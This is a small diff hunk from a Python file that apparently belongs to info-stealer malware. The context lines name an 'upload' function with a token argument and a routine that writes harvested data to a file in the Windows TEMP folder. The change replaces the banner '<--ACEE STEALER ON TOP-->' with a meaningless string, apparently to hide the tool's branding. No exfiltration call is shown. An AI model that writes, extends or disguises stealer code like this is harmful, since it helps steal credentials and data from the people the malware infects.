@@ -189,7 +189,7 @@ def upload(name, tk=''):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--ACEE STEALER ON TOP-->\n\n")
+        f.write(f"<--UATDHEFAK-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
